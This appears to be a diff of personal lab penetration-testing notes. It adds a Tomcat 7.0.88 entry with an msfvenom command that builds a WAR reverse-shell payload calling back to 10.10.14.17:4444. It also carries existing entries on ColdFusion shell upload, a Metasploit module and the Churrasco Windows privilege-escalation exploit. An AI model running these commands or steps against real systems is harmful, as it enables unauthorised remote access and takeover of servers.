@@ -552,7 +552,6 @@ Pattern
          Gain initial creds
          Then upload shell from the website
             https://nets.ec/Coldfusion_hacking#Writing_Shell_to_File
-            
       msfconsole
           16788.rb
           search coldfusion       
@@ -564,6 +563,13 @@ Pattern
           Troubleshooting - Turn on Burp suite 
               Proxy --> options --> Proxy Listeners --> add --> Bind to port 8500 --> request handling 10.10.10.11:8500 
               Firefox  localhost:8500 
+              
+   Tomcat 7.0.88
+      Creds from the web
+      then exploit WAR
+             msfvenom -p java/shell_reverse_tcp lhost=10.10.14.17 lport=4444 -f war -o pwn.war 
+             
+             
 Windows Kernel
 Windows Server 2003 SP2
       https://github.com/Re4son/Churrasco
